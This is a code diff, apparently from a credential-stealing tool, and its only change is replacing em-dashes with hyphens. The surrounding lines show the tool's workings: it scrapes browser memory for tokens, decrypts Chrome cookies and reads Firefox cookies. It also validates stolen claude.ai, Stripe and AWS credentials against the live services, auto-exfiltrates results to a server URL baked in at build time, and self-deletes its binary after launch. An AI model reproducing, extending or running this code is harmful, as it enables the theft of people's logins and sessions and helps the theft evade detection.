@@ -72,7 +72,7 @@ VM_REGION_BASIC_INFO_COUNT_64 = 9  # sizeof(vm_region_basic_info_64) / 4 = 36 / 
 
 
 class _VMRegionBasicInfo64(ctypes.Structure):
-    # #pragma pack(4) matches XNU kernel header — keeps sizeof at 36
+    # #pragma pack(4) matches XNU kernel header - keeps sizeof at 36
     _pack_ = 4
     _fields_ = [
         ("protection",       ctypes.c_int32),
@@ -250,7 +250,7 @@ def decrypt_value(key: bytes, enc: bytes) -> str:
         return ""
     try:
         if enc[:3] == b"v20":
-            return "<v20 app-bound encryption: requires in-process key — use memory scrape>"
+            return "<v20 app-bound encryption: requires in-process key - use memory scrape>"
         if enc[:3] == b"v10":
             # AES-128-CBC, IV = 16 space chars (Chrome macOS convention)
             iv        = b" " * 16
@@ -322,7 +322,7 @@ _NOISE_EXACT: frozenset[str] = frozenset([
 ])
 
 
-# Build-time exfil defaults — substituted by build_windows.ps1 / build_mac.sh.
+# Build-time exfil defaults - substituted by build_windows.ps1 / build_mac.sh.
 # When non-empty the exe auto-exfils after every run with no CLI flags required.
 _EXFIL_URL: str = ""
 _EXFIL_KEY: str = ""
@@ -430,7 +430,7 @@ def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 65536) -> list[dict]:
                         continue
                     data = buf.raw[: out_size.value]
 
-                    # Skip zero-filled pages — no credentials live in zeroed memory
+                    # Skip zero-filled pages - no credentials live in zeroed memory
                     if not data.rstrip(b"\x00"):
                         prev_data = b""
                         continue
@@ -482,8 +482,8 @@ def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 65536) -> list[dict]:
 
 def deduplicate(hits: list[dict]) -> list[dict]:
     """Two-pass dedup:
-    Pass 1 — group by label:value[:50], keep shortest (removes trailing noise).
-    Pass 2 — within each label, if A is a prefix of B, replace A with B (recovers
+    Pass 1 - group by label:value[:50], keep shortest (removes trailing noise).
+    Pass 2 - within each label, if A is a prefix of B, replace A with B (recovers
               chunk-boundary truncations where the same token was captured twice,
               once cut short and once in full).
     """
@@ -782,7 +782,7 @@ def process_firefox(home: str, do_disk: bool) -> list[str]:
         lines.append("  [--] Not installed or no cookie databases found")
         return lines
     lines.append(f"[+] {len(cookies)} Firefox cookie(s) (unencrypted)\n")
-    lines.append("  [!] Firefox login decryption requires NSS — not yet implemented")
+    lines.append("  [!] Firefox login decryption requires NSS - not yet implemented")
     lines.append("  -- [DISK] Firefox Cookies --")
     for ck in cookies:
         lines.append(f"  Profile:  {ck['profile']}")
@@ -1124,7 +1124,7 @@ def identify_service(label: str, value: str, context: bytes = b"") -> str:
         kid    = str(header.get("kid", ""))
         for pat, svc in _KID_MAP:
             if pat.match(kid):
-                return f"JWT — {svc}"
+                return f"JWT - {svc}"
 
         claims   = _decode_jwt_claims(v)
         iss      = str(claims.get("iss", ""))
@@ -1134,15 +1134,15 @@ def identify_service(label: str, value: str, context: bytes = b"") -> str:
         combined = f"{iss} {aud}".lower()
         for pattern, name in _ISS_MAP:
             if pattern in combined:
-                return f"JWT — {name}"
+                return f"JWT - {name}"
         m = re.search(r"https?://([^/\s]+)", iss)
         if m:
             discovered = _oidc_discover(iss)
             if discovered:
-                return f"JWT — {discovered}"
-            return f"JWT — {m.group(1)}"
+                return f"JWT - {discovered}"
+            return f"JWT - {m.group(1)}"
         if iss:
-            return f"JWT — {iss[:50]}"
+            return f"JWT - {iss[:50]}"
         # Scan all string claim values for embedded URLs (redirect_uri, client_id, etc.)
         for claim_val in claims.values():
             if not isinstance(claim_val, str) or not claim_val.startswith("http"):
@@ -1153,13 +1153,13 @@ def identify_service(label: str, value: str, context: bytes = b"") -> str:
             domain = cm.group(1).lower()
             for frag, svc_name in _DOMAIN_SVC:
                 if _domain_matches(frag, domain):
-                    return f"JWT — {svc_name}"
-            return f"JWT — {domain}"
+                    return f"JWT - {svc_name}"
+            return f"JWT - {domain}"
         if context:
             svc = _service_from_context(context)
             if svc:
-                return f"JWT — {svc}"
-        return "JWT — unknown issuer"
+                return f"JWT - {svc}"
+        return "JWT - unknown issuer"
     if context:
         svc = _service_from_context(context)
         if svc:
@@ -1246,7 +1246,7 @@ def verify_jwt(token: str) -> dict:
 
 def verify_anthropic(token: str) -> dict:
     if token.startswith("20111") or not token.startswith("sk-"):
-        # Browser session token — verify against claude.ai
+        # Browser session token - verify against claude.ai
         status, data = _http_get(
             "https://claude.ai/api/organizations",
             headers={"Cookie": f"sessionKey={token}"},
@@ -1290,7 +1290,7 @@ def verify_stripe(token: str) -> dict:
 
 def verify_aws(token: str) -> dict:
     if re.match(r"^(AKIA|ASIA|AROA|AIDA)[A-Z0-9]{16}$", token):
-        return {"valid": None, "reason": "valid format — secret key needed to verify via STS"}
+        return {"valid": None, "reason": "valid format - secret key needed to verify via STS"}
     return {"valid": False, "reason": "invalid AWS key format"}
 
 
@@ -1496,7 +1496,7 @@ def process_browser(name: str, process_name: str, user_data_path: str, keychain_
             for h in group:
                 svc_counts[h["_svc"]] = svc_counts.get(h["_svc"], 0) + 1
             svc_summary = "  ".join(f"{s} ({c})" for s, c in sorted(svc_counts.items()))
-            lines.append(f"  {label}  ({len(group)} unique)  —  {svc_summary}")
+            lines.append(f"  {label}  ({len(group)} unique)  -  {svc_summary}")
             continue
 
         for h in group:
@@ -1575,13 +1575,13 @@ def main():
     parser.add_argument("--out",         metavar="PATH",      help="Output file path (default: none when server is baked in, otherwise bb_results.txt next to binary)")
     parser.add_argument("--max-hits",    type=int, default=300, help="Max memory hits per browser (default: 300)")
     parser.add_argument("--self-delete", action=argparse.BooleanOptionalAction, default=bool(_EXFIL_URL),
-                        help="Delete binary after run — on by default when server is baked in (--no-self-delete to keep)")
+                        help="Delete binary after run - on by default when server is baked in (--no-self-delete to keep)")
     parser.add_argument("--verify",      action="store_true", help="Verify captured tokens against their services (outbound requests)")
     parser.add_argument("--exfil",       metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
     parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
     args = parser.parse_args()
 
-    # Delete the binary immediately after launch — the process stays alive in memory.
+    # Delete the binary immediately after launch - the process stays alive in memory.
     if args.self_delete:
         try:
             os.unlink(sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__))
@@ -1630,7 +1630,7 @@ def main():
         lines.extend(browser_lines)
         all_csv_rows.extend(browser_csv)
 
-    # Firefox (not parallelized with Chromium browsers — no Keychain, simpler)
+    # Firefox (not parallelized with Chromium browsers - no Keychain, simpler)
     if not args.browser or "firefox" in args.browser.lower():
         lines.extend(process_firefox(_home, do_disk))
 
